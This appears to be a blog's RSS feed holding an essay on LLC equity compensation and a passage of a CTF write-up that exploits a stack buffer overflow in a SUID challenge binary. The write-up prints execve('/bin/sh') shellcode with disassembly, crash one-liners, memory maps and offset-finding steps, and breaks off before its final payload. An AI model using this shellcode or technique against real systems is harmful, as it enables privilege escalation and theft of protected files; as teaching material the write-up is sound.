<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Mike&#39;s Blog</title>
    <link>https://michael-myers.github.io/blog/index.xml</link>
    <description>Recent content on Mike&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 13 Feb 2017 23:41:37 -0500</lastBuildDate>
    <atom:link href="https://michael-myers.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Evaluating Equity as Compensation</title>
      <link>https://michael-myers.github.io/blog/post/equity-as-compensation/</link>
      <pubDate>Mon, 13 Feb 2017 23:41:37 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/equity-as-compensation/</guid>
      <description>&lt;p&gt;The traditional model of entrepreneurship is:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;concept&lt;/li&gt;
&lt;li&gt;plan&lt;/li&gt;
&lt;li&gt;venture funding&lt;/li&gt;
&lt;li&gt;exit&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It seems like most people just unquestioningly accept that this is the natural sequence of events, but why is it this way? Isn&amp;rsquo;t there something missing from this? Like what about the focus on the customer, or about actually making a great service or product? If a business is working, why do you need to leave? What&amp;rsquo;s the rush? Why do you immediately go from borrowing money to looking for a buyer? This sounds more like house flipping than entrepreneurship. Accepting venture capital funding means accepting their short-sighted outsider influence, and this is what creates the pressure for an exit (rather than the creation of a stable, sustainable business).&lt;/p&gt;

&lt;p&gt;The frothy market of dollar-chasing VC-backed pump &amp;amp; dump schemes is probably the worst way to try to generate a world-changing technological breakthrough. &lt;em&gt;We live in a world where every problem left worth solving is a difficult multi-disciplinary one that requires long-term-horizon thinking&lt;/em&gt;. If you are just planning to make money, you may not care. If you are paying some lip service to making the world a better place, though, this seems like a case of some misaligned values.&lt;/p&gt;

&lt;p&gt;What about the technical staff, in all of this? The scientists, engineers, programmers. They get left holding the bag on step 4, that&amp;rsquo;s what. They get &lt;a href=&#34;http://www.urbandictionary.com/define.php?term=rolled&amp;amp;defid=175634&#34;&gt;rolled&lt;/a&gt;. At best, after &amp;ldquo;exit,&amp;rdquo; they have a new management team and a 5-10% retention bonus for a couple of years. More likely, everything they liked about the job culture goes out the window and they get to watch the 2 or 3 founders drive off in their new luxury sport sedans, with a cash cushion that makes them set for life. At worst, the technical staff will get laid off shortly after the acquisition and/or the business will implode.&lt;/p&gt;

&lt;p&gt;Most people over the age of 25 have become wise to this trajectory of events. For tech labor, it&amp;rsquo;s theoretically still a seller&amp;rsquo;s market (seller, here, being the &lt;em&gt;employee&lt;/em&gt; in the employee-employer relationship). So prospective employees naturally want to be paid not just a salary, but to actually feel like they are sitting at the table. High-value employees want to be cut in (to use another poker metaphor). If you as the employer &lt;em&gt;don&amp;rsquo;t&lt;/em&gt; cut them in, science has shown: &lt;a href=&#34;http://esop.com/pdf/esopHistoryAndResearch/researchEvidence.pdf&#34;&gt;you will be getting 5% less value out of them than you could be&lt;/a&gt;, if you can even hire and retain them in the first place.&lt;/p&gt;

&lt;p&gt;Offers of equity to new employees are exceedingly common in venture-capital startup land. But even in government land, it&amp;rsquo;s not unheard of to work for a company with strong employee-ownership values. SAIC &lt;a href=&#34;http://www.beyster.com/SAIC-Solution-Singh-Review.pdf&#34;&gt;is (was, before its board took its stock public and then the model imploded) one well-known success story&lt;/a&gt;, and in the early 2000&amp;rsquo;s I worked for another &lt;a href=&#34;https://www.parsons.com/markets/Pages/Sparta.aspx&#34;&gt;lesser-known company&lt;/a&gt; that used an identical compensation system (the founders of the two companies were friends, actually, and launched the companies in parallel). I have actually worked under a few different equity models over the years: a fully-employee-owned model (some in stock, some in NQO options), a profit-sharing &amp;ldquo;equity&amp;rdquo; model, and a no-equity model.&lt;/p&gt;

&lt;p&gt;Business finance is not my specialty, but I believe that we as engineers should not adopt a learned helplessness. Many of us have a disinterest in the topic of money. Yes, equity compensation is complicated – even suspiciously so – and dry. Boring, even crass. But we should take an interest in ourselves, because nobody else will. Don&amp;rsquo;t accept being exploited. This is about the empowerment of labor vs. capital.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/jlevy/og-equity-compensation&#34;&gt;The Open Guide to Equity Compensation&lt;/a&gt; is a community project to aggregate information to help improve the financial literacy of people in tech, specifically, to spread the kind of sophistication necessary to evaluate a compensation offer that is either all or partially made in terms of company equity. If you&amp;rsquo;ve never read this guide, do so now! There is seriously good info there, and you may save yourself from making an expensive mistake.&lt;/p&gt;

&lt;p&gt;The Open Guide still has a gap when it comes to LLCs, though, so I will add some wisdom from personal experience. If you plan on working at a small less-established or newly established LLC, and are considering an equity offer:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;know that LLCs&amp;rsquo; equity sharing structure is different from Corporations, and advice on LLC equity is much harder to find, since LLCs are newer and less common than Corporations&lt;/li&gt;
&lt;li&gt;the equity offer should be in writing, &lt;em&gt;signed&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;the offer should specify the award &lt;em&gt;and&lt;/em&gt; vesting timeline. If an &lt;em&gt;option&lt;/em&gt; award, it should specify the &lt;em&gt;award&lt;/em&gt; &lt;em&gt;price&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;the offer should specify the &lt;em&gt;valuation method&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;the offer should be in &lt;em&gt;percentage&lt;/em&gt; terms, not in terms of some malleable &lt;em&gt;unit&lt;/em&gt; (fraction with an unknown denominator)&lt;/li&gt;
&lt;li&gt;the offer should contain no loophole words like &amp;ldquo;intend to,&amp;rdquo; but be worded as a commitment, like &amp;ldquo;shall&amp;rdquo; or &amp;ldquo;will&amp;rdquo;&lt;/li&gt;
&lt;li&gt;if the equity-sharing plan structure is still TBD, &lt;em&gt;consider the offer worthless&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Especially that last bullet, since it supercedes everything else. Once you accept the offer of employment, you lose all leverage. Once you have lost leverage, your &amp;ldquo;equity&amp;rdquo; (if you ever get it) will be defined as something worth nearly zero, in a way that most favors the company. Your &lt;em&gt;award&lt;/em&gt; of, say, a defined percent of the valuation of the company can be interpreted to mean an &lt;em&gt;option&lt;/em&gt; grant to &lt;em&gt;purchase&lt;/em&gt; some equity. Remember, it&amp;rsquo;s not an &lt;em&gt;award&lt;/em&gt; if you have to &lt;em&gt;buy&lt;/em&gt; it, it has no present value if you have to buy it at-or-above the present value when granted, and it&amp;rsquo;s not &lt;em&gt;worth anything&lt;/em&gt; if you can&amp;rsquo;t sell it. Check: are you basically buying an illiquid asset with a tax consequence? Is this thing going to pay dividends until you can sell it? And for an LLC, also realize that you &lt;em&gt;might&lt;/em&gt; have to give up employee (W-2) status and start paying more taxes on your salary, too.&lt;/p&gt;

&lt;p&gt;See, with LLCs, you cannot get stocks, you can only get &amp;ldquo;membership interest units.&amp;rdquo; In an LLC, equity might be in the form of Profits Interest Units (not to be confused with &lt;em&gt;profit sharing&lt;/em&gt;). &amp;ldquo;Profit interest&amp;rdquo; is a junior form of equity in every sense of the term – if you want the Big Boy equity (ownership) in an LLC you want &amp;ldquo;Capital Interest.&amp;rdquo; Either way though, unlike a stock, these two kinds of LLC Interests may be restricted in a way that prevents them from being freely transferred. You might have to hold it until the company itself is sold. And there are complicated consequences for taxation and accounting, that all threaten to make them more trouble than they are really worth, especially for small amounts.&lt;/p&gt;

&lt;p&gt;Here is a table to help roughly compare LLC equity offers with traditional coporation equity offers.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;Equity in a C- or S-Corporation&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Equity in a LLC (the closest parallel)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Stock Option&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Profits Interests Units &lt;em&gt;or&lt;/em&gt; Options for Capital Interests&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Restricted Stock Units (RSU)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Capital Interests Units&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&amp;ldquo;Phantom Stock&amp;rdquo;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;(Membership Interest) Unit Rights, a.k.a. &amp;ldquo;Phantom Equity&amp;rdquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Stock Appreciation Rights (SAR), a.k.a. Phantom Stock Option&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;(Membership Interest) Unit Appreciation Rights&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;The more established an LLC company is, the less attractive a Profits Interest Unit becomes, relative to a Capital Interest Unit.&lt;/strong&gt; That is because a Profits Interest value is only in the &lt;em&gt;future appreciation&lt;/em&gt; of the value of the company, whereas a grant of Capital Interest is an immediate share of the value of the LLC as of the date that the interest is granted. In addition, the longer an employer can drag its feet and delay the award of a Profit Interest Unit, the less value it is to you. That&amp;rsquo;s why award date, strike price, and vesting schedule are all very important.&lt;/p&gt;

&lt;p&gt;If Amazon were an LLC, would you rather be granted – today – a 1% &lt;a href=&#34;https://ycharts.com/companies/AMZN/profit_margin&#34;&gt;&lt;em&gt;profit interest&lt;/em&gt;&lt;/a&gt;? Or 1% &lt;a href=&#34;https://ycharts.com/companies/AMZN/market_cap&#34;&gt;&lt;em&gt;equity&lt;/em&gt;&lt;/a&gt;? Amazon is infamously unprofitable, but also enormous. And if it were a profit interest, would you rather have that five years ago, or today? Five years ago obviously: even though Amazon is unprofitable, a PIU represents both profit and appreciation of company valuation, which for Amazon is like a 450% increase.&lt;/p&gt;

&lt;p&gt;Also, keep in mind that an LLC can always allocate its gross profit in any given year so as to lower (or eliminate) net profit, disbursing the money in (almost) any way that it sees fit. The management team feels like paying all the profits out as bonuses this year? That comes at the expense of the PIU holders. A company car for the CEO? Sorry PIU holders. If you get a great PIU award and it&amp;rsquo;s fully vested today, but tomorrow the LLC is sold? Sorry, there hasn&amp;rsquo;t been any growth in the company value over that period, so your PIUs are worth zero.&lt;/p&gt;

&lt;p&gt;Anyway, I hope this has been useful. If you disagree or think I am misinformed, I am open to discussions; find me on Twitter. I encourage everyone to educate themselves using multiple sources, and I don&amp;rsquo;t claim to be an authority on this subject. In fact, here&amp;rsquo;s a disclaimer.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;*This blog post and all associated comments and discussion do not constitute legal or tax advice in any respect. &lt;em&gt;The author has prepared this material for informational purposes only, and it is not intended to provide, and should not be relied on for, tax, legal or accounting advice. The author is not a licensed practitioner in taxes, law, or accounting. No reader should act or refrain from acting on the basis of any information presented herein without seeking the advice of counsel in the relevant jurisdiction. The author(s) expressly disclaim all liability in respect of any actions taken or not taken based on any contents of this guide or associated content.&lt;/em&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Enigma2017 CTF Overflowme Writeup</title>
      <link>https://michael-myers.github.io/blog/post/enigma2017-overflowme-writeup/</link>
      <pubDate>Sun, 12 Feb 2017 17:52:54 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/enigma2017-overflowme-writeup/</guid>
      <description>

&lt;p&gt;As mentioned in my last post, I spent some time solving security challenges posted on HackCenter for the Enigma2017 conference. This one (obviously) was to exploit a buffer overflow vulnerability. It was meant to be relatively easy, but sometimes you don&amp;rsquo;t realize the easiest approach first. I&amp;rsquo;ll walk through not just the solution, but the things I tried that &lt;em&gt;didn&amp;rsquo;t&lt;/em&gt; work. It was a refresher course in exploitation for me – I&amp;rsquo;ve spent many years on defense research and needed to brush up again. I know that this is a fast walkthrough, but I don&amp;rsquo;t want to try to teach every concept here, since it is a rather basic exercise, and many others have already explained them elsewhere. If you&amp;rsquo;re reading and would like clarification, feel free to hit me up on Twitter.&lt;/p&gt;

&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;

&lt;p&gt;They provided a web shell (literally a terminal emulator in your browser, at HackCenter.com) to a Linux host, and they even gave some free shellcode, &lt;code&gt;\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80&lt;/code&gt;. You can disassemble this several ways, but a fast and easy way is &lt;a href=&#34;https://alexaltea.github.io/capstone.js/&#34;&gt;someone else&amp;rsquo;s server running Capstone.js&lt;/a&gt;. We observe that it is an &lt;code&gt;execve&lt;/code&gt; syscall at the end, and apparently is running &lt;code&gt;/bin/sh&lt;/code&gt; to provide a shell. We already &lt;em&gt;have&lt;/em&gt; a shell, so there must be something different about this target process they want us to exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;    31 C0   xor eax, eax                # eax = NULL
    F7 E9   imul ecx
    50      push eax                    # the NULL that terminates the string
    68 2F 2F 73 68  push 0x68732f2f     # not a pointer! The string: “h//sh”
    68 2F 62 69 6E  push 0x6e69622f     # not a pointer! The string: “h/bin”
    89 E3   mov ebx, esp
    50      push eax                    # the NULL that terminates the string
    68 2D 69 69 69  push 0x6969692d     # the string “h-iii”
    89 E6   mov esi, esp
    50      push eax                    # arguments
    56      push esi                    #	  to
    53      push ebx                    #		execve()
    89 E1   mov ecx, esp
    B0 0B   mov al, 0xb                 # the code number for execve()
    CD 80   int 0x80                    # syscall()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let&amp;rsquo;s take a look at the shell we are given:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ uname -a
Linux enigma2017 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64 GNU/Linux
$ pwd
/problems/9ae8cc98f274aa6de77715eb9bdea7ed
$ ls -la
total 24                     
drwxr-xr-x  2 root       root         4096 Jan 27 16:07 .
drwxr-x--x 89 root       root         4096 Jan 27 16:07 ..
-r--r-----  1 hacksports overflowme_0   33 Jan 31 18:57 key
-rwxr-sr-x  1 hacksports overflowme_0 6088 Jan 31 18:57 overflowme
-rw-rw-r--  1 hacksports hacksports    530 Jan 31 18:57 overflowme.c
$ id
uid=1883(myname) gid=1884(myname) groups=1884(myname),1001(competitors)
$ checksec --file overflowme
# ...weirdly, checksec never returns, a bug in HackCenter maybe...
$ cat /proc/sys/kernel/randomize_va_space
2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice the permissions for the &lt;code&gt;overlowme&lt;/code&gt; binary include the &lt;a href=&#34;https://en.wikipedia.org/wiki/Setuid&#34;&gt;SUID access right flag&lt;/a&gt;. When you run this binary, it runs as the user &lt;code&gt;hacksports&lt;/code&gt;, who is the owner of &lt;code&gt;key&lt;/code&gt; and can read it. The goal here is to run arbitrary code in this process and use it to read &lt;code&gt;key&lt;/code&gt;. The given shellcode, executed by &lt;code&gt;overflowme&lt;/code&gt;, would provide us a shell where we have the ability to read &lt;code&gt;key&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Notice also the last command, which reads out the ASLR setting: 2. That means that we should expect the OS to randomize the layout of the program&amp;rsquo;s memory when it runs (both text &lt;em&gt;and&lt;/em&gt; data segments, is what 2 means).&lt;/p&gt;

&lt;p&gt;What about the source code they&amp;rsquo;re letting us see?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;quot;inspection.h&amp;quot;

void vuln(char *str) {
    char buf[979];
    sprintf(buf, &amp;quot;Hello %s&amp;quot;, str);
    puts(buf);
    fflush(stdout);
    return;
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv) {

    if (argc != 2) {
        printf(&amp;quot;Usage: %s [name]\n&amp;quot;, argv[0]);
        return 1;
    }

    be_nice_to_people();
    vuln(argv[1]);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-vulnerability&#34;&gt;The Vulnerability&lt;/h2&gt;

&lt;p&gt;This is a stack-based buffer overflow in the sprintf() call. A fixed-length buffer, &lt;code&gt;buf[979]&lt;/code&gt; takes a user input of unchecked (and unlimited) length, in the program&amp;rsquo;s first command-line argument. Since &lt;code&gt;buf&lt;/code&gt; is on the stack (as it is a local variable to the function &lt;code&gt;vuln&lt;/code&gt;), this is a stack-based buffer overflow.&lt;/p&gt;

&lt;p&gt;There are many, many guides out there that explain what happens when you overflow a stack-based buffer on a program that was compiled with absolutely no exploit mitigations: your input overwrites the saved return pointer (also on the stack), and the function epilogue&amp;rsquo;s &lt;code&gt;RET&lt;/code&gt; instruction transfers code execution to the address that is now part of the overflowed input. So, the attacker decides where execution will go: arbitrary code execution.&lt;/p&gt;

&lt;p&gt;Proof of the vulnerability:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ./overflowme `perl -e &#39;print &amp;quot;\x30&amp;quot;x982&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;or if you prefer Python:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ ./overflowme `python -c &#39;print &amp;quot;\x30&amp;quot;*982&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-exploitation&#34;&gt;The Exploitation&lt;/h2&gt;

&lt;p&gt;Successful exploitation in a real-world scenario would require multiple prerequisite steps, but this is a simplified exploitaiton case. We just need to solve a few things.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Determine the offset in the attack input at which it overwrites the stored return pointer. These bytes have to point to where execution should go.&lt;/li&gt;
&lt;li&gt;In order to complete step 1, determine the address where execution should go.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let&amp;rsquo;s start with the 2nd thing. Check the process memory map by launching it under GDB and using ProcFS:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) start
(gdb) shell ps
# ... observe the PID of overflowme, it is 32687
(gdb) shell cat /proc/32687/maps
08048000-08049000 r-xp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
08049000-0804a000 rwxp 00000000 ca:02 2490631     /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f7570000-f7571000 rwxp 00000000 00:00 0
f7571000-f7718000 r-xp 00000000 ca:02 786437      /lib32/libc-2.19.so
f7718000-f771a000 r-xp 001a7000 ca:02 786437      /lib32/libc-2.19.so
f771a000-f771b000 rwxp 001a9000 ca:02 786437      /lib32/libc-2.19.so
f771b000-f771f000 rwxp 00000000 00:00 0
f772a000-f772b000 rwxp 00000000 00:00 0
f772b000-f772c000 r-xp 00000000 00:00 0           [vdso]
f772c000-f772e000 r--p 00000000 00:00 0           [vvar]
f772e000-f774e000 r-xp 00000000 ca:02 786434      /lib32/ld-2.19.so
f774e000-f774f000 r-xp 0001f000 ca:02 786434      /lib32/ld-2.19.so
f774f000-f7750000 rwxp 00020000 ca:02 786434      /lib32/ld-2.19.so
fff84000-fffa5000 rwxp 00000000 00:00 0           [stack]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last memory range, &lt;code&gt;[stack]&lt;/code&gt; is executable. You would not see this anymore these days, but this makes exploitation easier, it means shellcode in the buffer overflow input itself can run where it exists, directly. So we just need to check where the buffer is on the stack and put the address into the buffer and we&amp;rsquo;re good to go?&lt;/p&gt;

&lt;p&gt;Well hold on. Recall that we saw ASLR was enabled in the OS. Let&amp;rsquo;s run it another time and see these maps again.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;08048000-08049000 r-xp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme           
08049000-0804a000 rwxp 00000000 ca:02 2490631   /problems/9ae8cc98f274aa6de77715eb9bdea7ed/overflowme
f75fd000-f75fe000 rwxp 00000000 00:00 0
f75fe000-f77a5000 r-xp 00000000 ca:02 786437    /lib32/libc-2.19.so
f77a5000-f77a7000 r-xp 001a7000 ca:02 786437    /lib32/libc-2.19.so    
f77a7000-f77a8000 rwxp 001a9000 ca:02 786437    /lib32/libc-2.19.so
f77a8000-f77ac000 rwxp 00000000 00:00 0
f77b7000-f77b8000 rwxp 00000000 00:00 0
f77b8000-f77b9000 r-xp 00000000 00:00 0         [vdso]
f77b9000-f77bb000 r--p 00000000 00:00 0         [vvar]
f77bb000-f77db000 r-xp 00000000 ca:02 786434    /lib32/ld-2.19.so
f77db000-f77dc000 r-xp 0001f000 ca:02 786434    /lib32/ld-2.19.so
f77dc000-f77dd000 rwxp 00020000 ca:02 786434    /lib32/ld-2.19.so
ffb9d000-ffbbe000 rwxp 00000000 00:00 0         [stack]  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;See that the stack is at a different address. The OS has applied ASLR to the data segments and the shared libraries for &lt;code&gt;libc&lt;/code&gt; and &lt;code&gt;ld&lt;/code&gt;. However, the entirety of the program binary itself has not moved. That is, apparently &lt;code&gt;overflowme&lt;/code&gt; was not even compiled with support for ASLR. Cool!&lt;/p&gt;

&lt;p&gt;Our shellcode is on the stack though, and the stack is one of the parts of memory that is moving around on every run. But that&amp;rsquo;s what we need a pointer to! Our only hope, then, is to find an instruction somewhere in the static mappings that jumps execution back to the stack. &lt;em&gt;Note: here is where I tried a number of unnecessary and fruitless solutions, thinking about this like a modern exploit developer (ROP gadgets, trampolines, etc.). If you just want to read the solution, skip to the next section where I &amp;ldquo;Phone a Friend.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;My goal was to find an &amp;ldquo;instruction gadget&amp;rdquo; within the static mapping that would effectively work as a &lt;code&gt;JMP ESP&lt;/code&gt; or &lt;code&gt;CALL ESP&lt;/code&gt;. Using &lt;code&gt;hexdump -C | grep FF&lt;/code&gt; I looked for &lt;code&gt;FF E4&lt;/code&gt; or &lt;code&gt;FF D4&lt;/code&gt; sequences. This is an extremely crude way to do this, but keep in mind the binary is very small. Unfortunately, &lt;em&gt;because&lt;/em&gt; it&amp;rsquo;s so small, there was also no occurence of either byte sequence.&lt;/p&gt;

&lt;p&gt;If any of the general-purpose registers at the time of the function return happen to also hold pointers to the stack range, then we could trampoline through a &lt;code&gt;JMP EAX/EBX/ECX/EDX&lt;/code&gt; or &lt;code&gt;CALL EAX/EBX/ECX/EDX&lt;/code&gt;, etc. So I also looked for any of these sequences. I found an &lt;code&gt;FF D0 (call EAX)&lt;/code&gt;, and a &lt;code&gt;FF D2 (call EDX)&lt;/code&gt;! Good, but do we control either of those registers? Check: &lt;code&gt;(gdb) info registers&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;eax            0x0      0                         
ebx            0xffa5d5a0       -5909088
ecx            0xf7726878       -143497096
edx            0x0      0
…
esp            0xffa5d56c       0xffa5d56c
ebp            0xffa5d588       0xffa5d588 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;annnnd no, they’re both 0x0 by the time the attacker gets control of &lt;code&gt;EIP&lt;/code&gt;. But what&amp;rsquo;s this, &lt;code&gt;EBX&lt;/code&gt; points into the stack (verified by another look at the &lt;code&gt;/proc/PID/maps&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ffa3e000-ffa5f000 rwxp 00000000 00:00 0		[stack]  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But alas, poring over the hexdump of the static mappings in memory, there is no &lt;code&gt;CALL EBX (FF D3)&lt;/code&gt; or &lt;code&gt;JMP EBX (FF E3)&lt;/code&gt; gadgets! There&amp;rsquo;s not even something more indirect, like a &lt;code&gt;PUSH EBX; RET (53 C3&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Another idea was to try to jump to one of the &lt;code&gt;GOT&lt;/code&gt; entries, but this is a tiny little toy binary! It doesn&amp;rsquo;t import anything useful, as we see with &lt;code&gt;objdump -T&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;DYNAMIC SYMBOL TABLE:                                                          
00000000      DF *UND*  00000000  GLIBC_2.0   printf                           
00000000      DF *UND*  00000000  GLIBC_2.0   fflush                           
00000000      DF *UND*  00000000  GLIBC_2.0   getegid                          
00000000      DF *UND*  00000000  GLIBC_2.0   puts                             
00000000  w   D  *UND*  00000000              __gmon_start__                   
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main                
00000000      DF *UND*  00000000  GLIBC_2.0   sprintf                          
00000000      DF *UND*  00000000  GLIBC_2.0   setresgid                        
08049a40 g    DO .bss   00000004  GLIBC_2.0   stdout                           
0804872c g    DO .rodata        00000004  Base        _IO_stdin_used 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If there was a &lt;code&gt;system()&lt;/code&gt; in here or something it would be a different story maybe, but as is, there are no useful standard library calls in this table.&lt;/p&gt;

&lt;p&gt;The ROP approach to this has failed me.&lt;/p&gt;

&lt;h2 id=&#34;phoning-a-friend&#34;&gt;Phoning a Friend&lt;/h2&gt;

&lt;p&gt;At this point I called a smart friend of mine for a tip on how to jump the instruction pointer to this stupid shellcode on the stack. We discussed more advanced gadget-finding using Z3 solvers and all sorts of stuff, but ultimately the hints that stuck with me were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Duh, you can stack spray like it&amp;rsquo;s 1992: just make your input 100KB, NOP-sled to the end where shellcode lies, and re-run the exploit until it works by chance (until the input happens to inhabit a range around the address we choose to put in the overflowed return pointer).&lt;/li&gt;
&lt;li&gt;You can store an arbitrary amount of NOP-sled in an environment variable and it will all get located in the stack segment.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;making-it-work&#34;&gt;Making It Work&lt;/h2&gt;

&lt;p&gt;Okay, so I have a good idea of how to (messily and probabilistically) get a successful exploit. The only thing I skipped over earlier was determining exactly how many bytes offset into the attack input we need to place the pointer. The way you do this is to use an exploit pattern string, such as you can &lt;a href=&#34;http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/&#34;&gt;generate online here&lt;/a&gt; or offline using &lt;a href=&#34;https://github.com/Svenito/exploit-pattern/blob/master/pattern.py&#34;&gt;various tools&lt;/a&gt;, and then watch the value of &lt;code&gt;EIP&lt;/code&gt; when the process crashes under GDB:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ gdb --args ./overflowme Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that the bytes from the pattern that fill EIP (little endian, remember) are &amp;quot;g8Bg&amp;quot;.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I chose a pointer that was in the middlish-range for the stack: 0xff881111, converted it into little-endian order, and put it into the attack string at the same location. We can confirm:&lt;/p&gt;

